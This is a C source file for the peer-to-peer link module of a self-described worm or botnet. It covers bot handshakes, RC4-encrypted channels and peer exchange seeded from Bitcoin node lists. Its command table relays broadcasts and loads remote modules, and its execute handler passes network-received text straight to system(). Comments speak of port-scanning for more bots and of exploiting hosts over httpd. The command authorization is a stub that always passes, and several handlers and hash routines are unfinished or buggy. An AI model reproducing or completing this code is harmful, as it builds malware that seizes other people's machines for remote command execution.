/*

bot link..

bots communicating directly, or via third party protocols

Nodes structure was already established for bitcoin..
we also want other protocols to be able to feed messages here

if it cannot connect for X time.. it could use desperate() to port scan for bot port,
also it can start checking every port 23 found for bot port since half the search is over

ip generate seed can be used to ensure different bots scan different IPs
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include "structs.h"
#include "list.h"
#include "utils.h"
#include "botlink.h"
#include "portscan.h"
#include <rc4.h>
// for reusing bitcon's node connection function
#include "modules/bitcoin/note_bitcoin.h"

#define BOT_PORT 4843
#define BOT_MAGIC 0xDABCADAA
#define BOT_PKT 0xAABBCCDD
#define MIN_BOT_CONNECTIONS 15
// timeout after 100 seconds of nothing.. ping/pong at 60
#define PING_TIMEOUT 60
// how many old hashes to store for broadcasts?
// will start at 64.. 16-20 is prob max ever required for millions
#define MAX_HASH_COUNT 64
// minimum seconds in between peer requests
#define PEER_REQ_MIN_TS 300
// how many peers to give after a request?
#define PEER_REQ_COUNT 15

uint32_t security_token = 0;



// for port scanning.. we only care about nodes (starting new connections)
// and the main loop
ModuleFuncs botlink_funcs = {
    &botlink_read,
    &botlink_write,
    &botlink_incoming,
    NULL, //&botlink_outgoing,
    &botlink_main_loop,
    &botlink_connect,
    NULL //&botlink_disconnect,
};

Modules HACK_botlink = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    BOT_PORT, 0,
    // required 0, 0..  
    0, 0,
    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &botlink_funcs, NULL,
    // no magic bytes for portscan
    NULL, 0
};



extern ExternalModules *external_list;

// various states of bot communication
enum {
    BOT_HANDSHAKE_IN=TCP_CONNECTED,
    BOT_HANDSHAKE_OUT=APP_HANDSHAKE,
    BOT_KEY_EXCHANGE=4096,
    BOT_PERFECT=STATE_OK
};



enum {
    BOT_CMD_PING,
    BOT_CMD_PONG,
    BOT_CMD_BROADCAST,
    BOT_CMD_LOADMODULE,
    BOT_CMD_UNLOADMODULE,
    BOT_CMD_EXECUTE,
    BOT_CMD_CONTROL_MODULE,
    BOT_CMD_REPORT_IP,
    BOT_CMD_WANT_PEERS,
    BOT_CMD_PEER_INFO,
    BOT_CMD_WRITE_FILE,
    BOT_CMD_READ_FILE,
};



/*
typedef struct _botlink_channel {
    struct _botlink_channel *next;
    int channel_id;
    int hops;    // decreasing hop counter (wont even stop on the node even if it is the node).. until another round
    int ack;
    int seq;
    int crypt;
    char *key;
    int key_len;
} BotChannel;
*/

typedef struct _bot_header {
    uint32_t magic;
    uint16_t len;
    //uint32_t checksum;
} BotMSGHdr;


// verify the packet is correct and has the entire packet..
int BotMSGVerify(char *buf, int size) {
    BotMSGHdr *_hdr = (BotMSGHdr *)buf;
    
    // ensure it has enough of the packet
    if (size < sizeof(BotMSGHdr)) return 0;
    // check if the magic is correct
    if (_hdr->magic != BOT_PKT) return -1;
    
    // add checksum here..
    
    // now verify we have the entire packet..
    if (size < (sizeof(BotMSGHdr) + _hdr->len)) {
        return 0;
    }
}


typedef struct _bot_variables {
    // in case we wanna save bot information for next connection
    struct _bot_variables *next;

    // encryption key
    char *key_in;
    int key_size_in;
    rc4_key rc4_iv_in;
    char *key_out;
    int key_size_out;
    rc4_key rc4_iv_out;
    
    // when we change keys.. this should be flagged
    // so after the CHOP we process all incoming data
    // with the new encryption key
    bool crypt_sync;
    
    // bot ID & size
    char *bot_id;
    int bot_id_size;
    
    // 64 * 4byte (uint32_t) p2p checksums..
    // so we do not continous to distribute the same msgs to same nodes
    // another option is to have a 'repeat' integer which gets decremented...
    // the issue is 'repeat' would be inside of the packet, and allows to be manipulated
    // this uses more memory.. ill test both and choose one
    int broadcast_i;
    uint32_t broadcast_hashlist[MAX_HASH_COUNT];
    
    // how many times has this bot requested peers?
    // so a bot cannot dump all peers easily..
    int req_peer_count;
    // and how long ago?
    int req_peer_ts;
    int ask_peer_ts;
} BotVariables;





BotVariables *BotVars(Connection *cptr) {
    return (BotVariables *)CustomPtr(cptr, sizeof(BotVariables));
}


// returns -1 on error, 0 if it already exist.. 1 if its ok
// itll automatically add it to the list..
int Broadcast_DupeCheck(Modules *mptr, Connection *cptr, char *msg, int size) {
    BotVariables *vars = BotVars(cptr);
    uint32_t hash = 0;
    int i = 0;
    
    if (vars == NULL) return -1;
    
    // calculate hash first
    hash = hash;
    
    // now scan the prior hashes for this one..
    for (i = 0; i < MAX_HASH_COUNT; i++) {
        // 0 means it didnt even ever get filled..
        if (vars->broadcast_hashlist[i] == 0) break;
        
        // if its found return 0 immediately..
        if (vars->broadcast_hashlist[i] == hash)
            return 0;
    }
    
    // put the hash in the hash list
    vars->broadcast_hashlist[vars->broadcast_i++ % MAX_HASH_COUNT] = hash;
    
    return 1;
}

// initialize the module
int botlink_init(Modules **_module_list) {
    Module_Add(_module_list, &HACK_botlink);
}

int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    int cur_ts = time(0);
    int i = 0;
    int node_count = 0;
    BotVariables *vars = NULL;
    // handle tcp/ip for each connection
    // will flush outgoing queue, and fill incoming
    
    // handle timers (ping/pong)
    // logic for enough nodes
    int connection_count = L_count((LIST *)mptr->connections);
    if (connection_count < MIN_BOT_CONNECTIONS) {
        // attempt to connect to however many nodes we are mising under X connections
        // reuse bitcoin connect nodes..
        bitcoin_connect_nodes(mptr, MIN_BOT_CONNECTIONS - connection_count);
        
        node_count = L_count((LIST *)mptr->node_list);
        
        if (node_count < MIN_BOT_CONNECTIONS) {
            for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
                vars = BotVars(cptr);
                if (vars == NULL) continue;
                if ((cur_ts - vars->ask_peer_ts) > PEER_REQ_MIN_TS) {
                    // ask this peer for new nodes..
                    bot_pushcmd(mptr, cptr, BOT_CMD_WANT_PEERS, NULL, 0);
                }
            }
        }
        
    } 
    
    for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
        i = (cur_ts - cptr->ping_ts);
        if (i > (PING_TIMEOUT*150/100)) {
            ConnectionBad(cptr);
            continue;
        }
        if (i > PING_TIMEOUT) {
            // send a ping message
            botlink_pingpong(mptr, cptr, 0);
        }
    }
}

// will handle encryption for talking to other bots
int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size) {
    BotVariables *vars = BotVars(cptr);
    //if (!vars || vars->key_size == 0) return *size;
    
    if (!stateOK(cptr)) return *size;
    
    // perform encryption
    rc4((unsigned char *)*buf, *size, &vars->rc4_iv_out);
    
    return *size;
}

// will handle decryption for communication with other bots
int botlink_read(Modules *mptr, Connection *cptr, char **buf, int *size) {
    BotVariables *vars = BotVars(cptr);
    //if (!vars || vars->key_size == 0) return *size;

    if (!stateOK(cptr)) return *size;
    
    // perform decryption
    rc4((unsigned char *)*buf, *size, &vars->rc4_iv_in);
    
    return *size;
}


// parsing incoming bot messages
int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    int i = 0;
    int ret = -1;
    BotVariables *vars = BotVars(cptr);
    struct _botlink_parsers {
        int state;
        module_func function;    
    } BotlinkParsers[] = {
        { BOT_HANDSHAKE_OUT, &botlink_handshake },
        { BOT_HANDSHAKE_IN, &botlink_handshake },
        { BOT_KEY_EXCHANGE, &botlink_keyexchange },
        { BOT_PERFECT, &botlink_message },
        { 0, NULL }
    };
    BotMSGHdr *_hdr = (BotMSGHdr *)buf;
    Queue *qptr = NULL;
    
    // ensure we have bot variables.. if not we wanna kill it
    if (vars == NULL) return ret;
    
    // verify whether or not the messages passes.. or not enough data, etc..
    i = BotMSGVerify(buf, size);
    
    // if it doesnt, or needs more data.. return that value
    if (i <= 0) return i;

    
    // ret = -1.. so if the function/state isnt found
    // itll break the connection.. and the function needs to return 1 to remove msgs
    for (i = 0; BotlinkParsers[i].function != NULL; i++) {
        if (BotlinkParsers[i].state == cptr->state) {
            ret = BotlinkParsers[i].function(mptr, cptr, buf + sizeof(BotMSGHdr), _hdr->len);
            break;
        }
    }
    
    // lets chop this buffer down by removing this command.. in case
    // a subsequent command was merged
    QueueChopBuf(cptr, buf, sizeof(BotMSGHdr) + _hdr->len);

    // now if we toggled cryptography.. lets apply it to all current incoming packets
    // its possible our module is slower than the remote side sending messages
    if (vars->crypt_sync) {
        vars->crypt_sync = 0;
                
        qptr = cptr->incoming;
        while (qptr != NULL) {
            
            rc4((unsigned char *)qptr->buf, qptr->size, &vars->rc4_iv_in);
            
            qptr = qptr->next;
        }
    }
    
    // we dont need the message anymore..
    return ret;
}

// all bot msgs use BotMSGHdr.. so this is called last before QueueAdd()
int bot_pushpkt(Modules *mptr, Connection *cptr, char *pkt, int pktsize) {
    char *buf = NULL;
    int size = 0;
    BotMSGHdr *hdr = NULL;
    int ret = -1;
    
    size = sizeof(BotMSGHdr) + pktsize;
    if ((buf = (char *)calloc(pktsize + 1, 1)) == NULL) {
        return -1;
    }
    
    hdr = (BotMSGHdr *)buf;
    hdr->magic = BOT_PKT;
    hdr->len = pktsize;
    //hdr->checksum = 0;
    
    memcpy(buf + sizeof(BotMSGHdr), pkt, pktsize);
    
    ret = QueueAdd(mptr, cptr, NULL, buf, size);
        
    free(buf);
    
    return ret;
}

// uses a security token to sign/authorize a command..
// ill have to find a decent cryptography method for this..
uint32_t bot_cmdauthorize(Modules *mptr, Connection *cptr, unsigned char cmd, char *pkt, int pktsize) {
    uint32_t ret = -1;
    
    // if we have no token (we didnt insert a security verification cert, or key to sign)
    if (security_token == 0)
        return ret;
        

    return ret;
}

// authorization roots (for signing/verification)
typedef struct _authorization_root {
    struct _authorization_root *next;
    char *data;
    int fd;
    uint32_t start_ts;
    
    int len;
} AuthorizationRoot;

AuthorizationRoot *authroots = NULL;

int AuthorizationInsert(char *data, int len, int copy) {
    AuthorizationRoot *aptr = NULL;
    aptr = (AuthorizationRoot *)L_add((LIST **)&authroots, sizeof(AuthorizationRoot));
    if (aptr == NULL) return -1;
    
    if (!copy) {
        aptr->data = data;
    } else {
        if ((aptr->data = (char *)malloc(len + 1)) == NULL)
            return -1;

        memcpy(aptr->data, data, len);
    }
    aptr->len = len;
    
    return 1;
}

bool AuthorizationCheck(Modules *mptr, Connection *cptr, char *pkt, int pktsize) {
    uint32_t hash = 0;
    int ret = false;
    
    hash = hash;
    
    // verify Authorization against roots
    ret = true;

    return ret;
}



int bot_pushcmd(Modules *mptr, Connection *cptr, unsigned char cmd, char *pkt, int pktsize) {
    int ret = 0;
    char *buf = NULL;
    int size = pktsize + sizeof(CMDHdr);
    CMDHdr *hdr = NULL;
    
    if ((buf = (char *)calloc(pktsize + 1, 1)) == NULL)
        return -1;
    
    // setup header pointer.. and setup commands
    hdr = (CMDHdr *)buf;
    hdr->cmd = cmd;
    hdr->size = pktsize;
    // cryptographically sign/authorize the command
    hdr->authorization = bot_cmdauthorize(mptr, cptr, cmd, pkt, pktsize);
    
    // copy packet behind header
    if (pkt != NULL && pktsize)
        memcpy(buf + sizeof(CMDHdr), pkt, pktsize);

    // send over to the main botlink packet command for distribution    
    ret = bot_pushpkt(mptr, cptr, pkt, pktsize);
    
    // free the buffer
    free(buf);
    
    return ret;
}


int bot_pushmagic(Modules *mptr, Connection *cptr) {
    char vbuf[16];
    char *sptr = (char *)&vbuf;

    put_int32(&sptr, BOT_MAGIC);
    
    return bot_pushpkt(mptr, cptr,(char *) &vbuf, sizeof(int32_t));
}

int bot_checkmagic(char *buf, int size) {
    int32_t magic = 0;
    
    // we are expecting the bot magic here..
    // we return 0 so that the message doesnt get removed..
    // we will wait for it to be at least the space required..
    if (size < sizeof(int32_t)) return 0;
    
    char *sptr = (char *)buf;
    magic = get_int32(&sptr);
    
    // ensure the bot magic is correct (like a handshake)
    if (magic != BOT_MAGIC) return -1;

    return 1;    
}

int bot_sendkey(Modules *mptr, Connection *cptr) {
    BotVariables *vars = BotVars(cptr);
    char *key = NULL;
    int key_size = 0;
    int i = 0;
    char *keybuf = NULL;
    int key_pkt_size = 0;
    char *sptr = NULL;
    
    // first generate a key
    key_size = 16 + rand()%32;
    if ((key = (char *)malloc(key_size + 1)) == NULL) {
        ConnectionBad(cptr);
        return -1;
    }
    
    for (i = 0; i < key_size; i++)
        key[i] = rand()%255;
    
    // set it up in outgoing key structure..
    vars->key_out = key;
    vars->key_size_out = key_size;
    
    // prepare rc4 iv (change to rc6, etc later)
    prepare_key((unsigned char *)vars->key_out, vars->key_size_out, &vars->rc4_iv_out);
    
    // build packet to give key to other side
    key_pkt_size = sizeof(int32_t) + key_size;
    
    if ((keybuf = (char *)calloc(key_pkt_size + 1, 1)) == NULL)
        return -1;
        
    // build final packet..
    sptr = (char *)keybuf;
    put_int32(&sptr, key_size);
    memcpy(sptr, key, key_size);
    
    // queue it..
    i = bot_pushpkt(mptr, cptr, keybuf, key_pkt_size);
    //i = QueueAdd(mptr, cptr, NULL, keybuf, key_pkt_size);
    
    // free temp key pkt from memory here..
    free(keybuf);
    // return queueadd response
    return i;
}

// whenever we connect to another bot
// needs to initiate handshake, etc
int botlink_connect(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    
    if (vars == NULL) {
        ConnectionBad(cptr);
        return 1;
    }

    bot_pushmagic(mptr, cptr); 
    
    cptr->state = BOT_HANDSHAKE_OUT;   
    
    // we want it to continue and process the outgoing queue after.. so return 0
    return 0;
}


int botlink_handshake(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    int32_t magic = 0;
    
    // we are expecting the bot magic here..
    // we return 0 so that the message doesnt get removed..
    // we will wait for it to be at least the space required..
    if (size < sizeof(int32_t)) return 0;
    
    // we could use buf but if we add more variables to handshake.. we'd have to add a new pointer
    char *sptr = (char *)buf;
    magic = get_int32(&sptr);
    
    // ensure the bot magic is correct (like a handshake)
    if (magic != BOT_MAGIC) return -1;
    
    // if we are not an outgoing connection.. then send the magic ourselves
    // we did it on connect() if we are outgoing 
    if (cptr->state != BOT_HANDSHAKE_OUT)
        bot_pushmagic(mptr, cptr);
    
    // if that was fine.. now we want to send over an encryption key
    // and we expect an encryption key from the other side..
    cptr->state = BOT_KEY_EXCHANGE;
    
    // and send our encryption key..
    // the other side should already be expecting since its the same code without the above IF for sending (which would be twice)
    if (bot_sendkey(mptr, cptr) == -1) return -1;
    
    return 1;
}



int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    int key_size = 0;
    char *ptr = (char *)buf;
    // ensure it has the size of the key   
    if (size < sizeof(int32_t)) return 0;
    // get the size of the key
    key_size = get_int32(&ptr);
    // ensure it has the entire key in the queue fragment    
    if (size < (sizeof(int32_t) + key_size)) return 0;
    // allocate space for the key
    if ((vars->key_in = (char *)malloc(key_size + 1)) == NULL) {
        // if that failed.. return 0.. maybe something fixes itself for next round
        return 0;
    }
    
    // copy key & state size in connection instructions
    memcpy(vars->key_in, ptr, key_size);    
    vars->key_size_in = key_size;
    // use rc4 function to initialize the key & key structure    
    prepare_key((unsigned char *)vars->key_in, vars->key_size_in, &vars->rc4_iv_in);
    
    // let the incoming func know we toggled encryption so a desync doesnt happen
    vars->crypt_sync = 1;
    
    // set state to perform a normal connection
    cptr->state = BOT_PERFECT;
    
    // after key exchange we will provide the opposide side with their IP address
    // this will be useful for further worm, and exploitation via httpd/etc
    bot_pushcmd(mptr, cptr, BOT_CMD_REPORT_IP, (char *)&cptr->addr, sizeof(uint32_t));
    return 1;
}


// push a ping, or pong to a bot
int botlink_pingpong(Modules *mptr, Connection *cptr, int pong) {
    unsigned char cmd = pong ? BOT_CMD_PONG : BOT_CMD_PING;
    
    return bot_pushcmd(mptr, cptr, cmd, NULL, 0);    
}

// push a pong to the side requesting..
int botlink_cmd_ping(Modules *mptr, Connection *cptr, char *buf, int size) {
    return botlink_pingpong(mptr, cptr, 1);
}

int botlink_cmd_report_ip(Modules *mptr, Connection *cptr, char *buf, int size) {
    uint32_t *_ip = (uint32_t *)buf;
    
    // set the reported IP in their structure..
    cptr->reported_addr = *_ip;
    
    return 1;
}

int botlink_give_peer(Modules *mptr, Connection *cptr, Node *nptr) {
    PeerInfo pinfo;
    
    pinfo.addr = nptr->addr;
    pinfo.port = nptr->port;
    
    // push peer to client..
    bot_pushcmd(mptr, cptr, BOT_CMD_PEER_INFO, (char *)&pinfo, sizeof(PeerInfo));
    
    return 1;
}

int botlink_cmd_want_peers(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    int i = 0;
    Node *nptr = NULL;
    
    if (vars->req_peer_count > 5) {
        ConnectionBad(cptr);
        return -1;
    }
    
    if ((time(0) - vars->req_peer_ts) < PEER_REQ_MIN_TS)
        return -1;
    
    // find random peers to give to this user 
    // later we need to sort out important peers.. and give only the newest and maybe somme other
    // algorithm to decide
    for (i = 0; i < PEER_REQ_COUNT; i++) {
        
        // grab a random node.. and perform logic checks
        nptr = nptr;
                
        if (nptr == NULL) break;
        
        // give peer to remote bot..
        botlink_give_peer(mptr, cptr, nptr);
    }
    
    return 1;
}

// we got a peer from another bot.. we have to create a node structure around it
int botlink_cmd_peer_info(Modules *mptr, Connection *cptr, char *buf, int size) {
    PeerInfo *pinfo = (PeerInfo *)buf;
    Node *nptr = NULL;

    if ((nptr = (Node *)L_add((LIST **)&mptr->node_list, sizeof(Node))) == NULL) {
        //oh well if we cannot add it.. let things continue
        return 1;
    }
    
    // add it from the structure
    nptr->addr = pinfo->addr;
    nptr->port = pinfo->port;
    
    return 1;    
}

// this is separate in case a p2p command comes in that has to be parsed correctly
// so no need to have duplicate code
int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, bool from_broadcast) {
    int ret = 1;
    int i = 0;
    BotVariables *vars = BotVars(cptr);
    CMDHdr *hdr = (CMDHdr *)buf;
    struct _bot_commands {
        // cmd identifier for pkts
        unsigned char cmd;
        // pointer for command
        module_func function;
        // minimum size of data for this command
        unsigned short minimum_size;
        // is this command available via broadcast? (security mechanism for corrupting all bots, etc)
        bool bcast;
        // cryptographically verify command before executing
        bool verify_hash;
    } BotCommands[] = {
        { BOT_CMD_PING, &botlink_cmd_ping, 0, false, false },
        { BOT_CMD_PONG, NULL, 0, false, false },
        // broadcast commands get verified before distribution
        { BOT_CMD_BROADCAST, &botlink_cmd_broadcast, 0, true, false },
        { BOT_CMD_REPORT_IP, &botlink_cmd_report_ip, sizeof(uint32_t), false, false },
        { BOT_CMD_LOADMODULE, &botlink_cmd_loadmodule, 0, true, false },
        { BOT_CMD_UNLOADMODULE, &botlink_cmd_unloadmodule, 0, true, false },
        { BOT_CMD_EXECUTE, &botlink_cmd_execute, 0, true, true },
        { BOT_CMD_WANT_PEERS, &botlink_cmd_want_peers, 0, false, false },
        { BOT_CMD_PEER_INFO, &botlink_cmd_peer_info, sizeof(PeerInfo), false, false },
        //{ BOT_CMD_CONTROL_MODULE, &botlink_cmd_control_module, true, true },
        { BOT_CMD_READ_FILE, &botlink_cmd_read_file, 0, true, true },
        { BOT_CMD_WRITE_FILE, &botlink_cmd_read_file, 0, true, true },
        { 0, NULL }
    };
    
    
    // if we do not have the full packet yet..
    if (size < sizeof(CMDHdr)) {
        // no point in having it save it.. damaged packet.. we can kill the connection more than likely..
        // it may be security exploit attempt
        ConnectionBad(cptr);
        return 1;
    }
    
    for (; BotCommands[i].function != NULL; i++) {
        if (BotCommands[i].cmd == hdr->cmd) {
            // we have to make sure the entire packet for this command exists
            if (BotCommands[i].minimum_size && (size - sizeof(CMDHdr)) < BotCommands[i].minimum_size) {
                // lets be very paranoid, and kill connection
                // with encryption, etc.. nothing will get this far by 'accident' fuck resync
                ConnectionBad(cptr);
                return 1;
            }

            // security / policy logic..
            if (BotCommands[i].verify_hash) {
                // if it doesnt pass authorization / signing verification then we disconnect the user
                // this should be some secure public key process.. ill insert something obfuscation wise in mean time
                if (!AuthorizationCheck(mptr, cptr, buf, size)) {
                    ConnectionBad(cptr);
                    return -1;
                }
            }
            // verify that the command is possible via broadcasting if its coming from one
            if (from_broadcast && BotCommands[i].bcast == false) {
                // error.. security / policy problem..
                // we will close connection immediately and exit..
                ConnectionBad(cptr);
                return -1;
            }
            
            // push to the correct command without the header
            if (BotCommands[i].function != NULL)        
                ret = BotCommands[i].function(mptr, cptr, buf + sizeof(CMDHdr), size - sizeof(CMDHdr));
                
            // ts we can deal with timeouts.. (and ping/pong)
            cptr->ping_ts = time(0);
            
            // if the cmd matches, and no function.. or function... we break PONG has no function and is ok
            break;
        }
    }
    
    return 1;    
}

int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size) {
    // execute it normally.. (not from a broadcast)
    return botlink_message_exec(mptr, cptr, buf, size, false);
}

// distributes a packet to the p2p network...
// so we dont continously give the same packet to the same nodes..
// we will verify against hashes already given to a node
int botlink_broadcast(Modules *mptr, Connection *cptr, char *buf, int size) {
    Connection *bptr = mptr->connections;
    int ret = 0;
    
    // we must verify authorization before we broadcast it!
    if (!AuthorizationCheck(mptr, cptr, buf, size)) {
        ConnectionBad(cptr);
        return -1;
    }
    
    // bptr already starts at the list.. now iterate through it
    while (bptr != NULL) {
        // if state is OK then its connected
        if (stateOK(bptr)) {
            // if its not a duplicate of a prior message recently distributed
            if (Broadcast_DupeCheck(mptr, cptr, buf, size)) {
                // push broadcast command w the packet
                if (bot_pushcmd(mptr, bptr, BOT_CMD_BROADCAST, buf, size) == 1)
                    ret++;
            }
        }
        
        bptr = bptr->next;
    }
    
    // return the amount of nodes distributed to
    return ret;
}

// allows us to give a full packet inside of a broadcast command to be executed on every bot
int botlink_cmd_broadcast(Modules *mptr, Connection *cptr, char *buf, int size) {
    // we must distribute this command to each bot we have..
    botlink_broadcast(mptr, cptr, buf, size);

    // and then finally we execute it ourselves
    return botlink_message_exec(mptr, cptr, buf, size, true);
}

// loads an external module from a p2p stream
int botlink_cmd_loadmodule(Modules *mptr, Connection *cptr, char *buf, int size) {
    ExternalModules *eptr = NULL;
    int ret = 0;
    
    int32_t module_id = get_int32(&buf);
    int32_t module_type = get_int32(&buf);
    
    eptr = ExternalAdd(module_type, module_id, buf, size - sizeof(int32_t), 1);
    
    return (eptr != NULL);
}

// loads an external module from a p2p stream
int botlink_cmd_unloadmodule(Modules *mptr, Connection *cptr, char *buf, int size) {
    ExternalModules *eptr = NULL;
    int ret = 0;
    
    int32_t module_id = get_int32(&buf);
    
    if ((eptr = ExternalFind(module_id)) != NULL) {
        ret = ExternalDeinit(eptr);
        if (ret == 1) {
            L_del((LIST **)external_list, (LIST *)eptr);
        }
    }
    
    return ret;
}


// executes a command from a p2p stream
int botlink_cmd_execute(Modules *mptr, Connection *cptr, char *buf, int size) {
    
    system(buf);
    
    return 1;
}

// we just expect the filename to end with a 0
// data comes immediately after
typedef struct _file_info {
    int file_name_len;
    int size;
} FileInfoHdr;

int botlink_cmd_write_file(Modules *mptr, Connection *cptr, char *buf, int size) {
    FileInfoHdr *finfo = (FileInfoHdr *)buf;
    char *fname = (char *)buf + sizeof(FileInfoHdr);
    char *data = (char *)(buf + sizeof(FileInfoHdr) + finfo->file_name_len);
        
}

int botlink_cmd_read_file(Modules *mptr, Connection *cptr, char *buf, int size) {
    FileInfoHdr *finfo = (FileInfoHdr *)buf;
    
    char *fname = (char *)buf + sizeof(FileInfoHdr);
    char *data = (char *)(buf + sizeof(FileInfoHdr) + finfo->file_name_len);
    
}


/*
// will finish control module later.. requires an overhaul on every module
int botlink_cmd_control_module(Modules *mptr, Connection *cptr, char *buf, int size) {
    return 1;
}
*/
// -- functions not in use..
/*

// whether we need to filter outgoing messages..
// disabled for now.. we wont be filtering our own messages
// for this module
int botlink_outgoing(Modules *mptr, Connection *cptr, char **buf, int *size) {
    
}

// disconnect is disabled for now.. since its irrelevant..
// maybe later we can save the clients structure in a holding place for a bit
int botlink_disconnect(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}
*/